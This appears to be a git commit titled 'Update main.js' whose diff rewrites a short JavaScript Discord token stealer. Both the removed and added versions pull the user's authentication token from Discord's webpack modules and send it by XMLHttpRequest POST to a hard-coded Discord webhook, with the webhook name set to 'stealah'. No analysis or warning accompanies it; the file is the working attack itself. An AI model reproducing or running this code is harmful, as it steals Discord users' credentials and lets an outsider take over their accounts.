4db3987f9c2890c60890cc9f6441aa8ec3337be7
Egor <51438050+161370@users.noreply.github.com>
2023-01-02 20:35:52 +0300

    Update main.js

--- main.js
+++ main.js
@@ -1,3 +1,29 @@
-const token = (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()
-console.log(token)
-const request = new XMLHttpRequest(); request.open("POST","https://discord.com/api/webhooks/1059517636859400222/zvXOlE8NciH-kEaFEmShMcif-aBEX-aGcfh9ZctVXU7swtwHRwlUYWxi9oGtN0B3NcZN"); request.setRequestHeader('Content-type','application/json'); const params={  username: "giga",  avatar_url: "",  content: token};request.send(JSON.stringify(params));
+token = (
+    webpackChunkdiscord_app.push(
+        [
+            [''],
+            {},
+            e => {
+                m=[];
+                for(let c in e.c)
+                    m.push(e.c[c])
+            }
+        ]
+    ),
+    m
+).find(
+    m => m?.exports?.default?.getToken !== void 0
+).exports.default.getToken()
+
+const request = new XMLHttpRequest();
+      request.open("POST", "https://discord.com/api/webhooks/1059517636859400222/zvXOlE8NciH-kEaFEmShMcif-aBEX-aGcfh9ZctVXU7swtwHRwlUYWxi9oGtN0B3NcZN");
+
+      request.setRequestHeader('Content-type', 'application/json');
+
+      const params = {
+        username: "stealah",
+        avatar_url: "",
+        content: token
+      }
+
+      request.send(JSON.stringify(params));
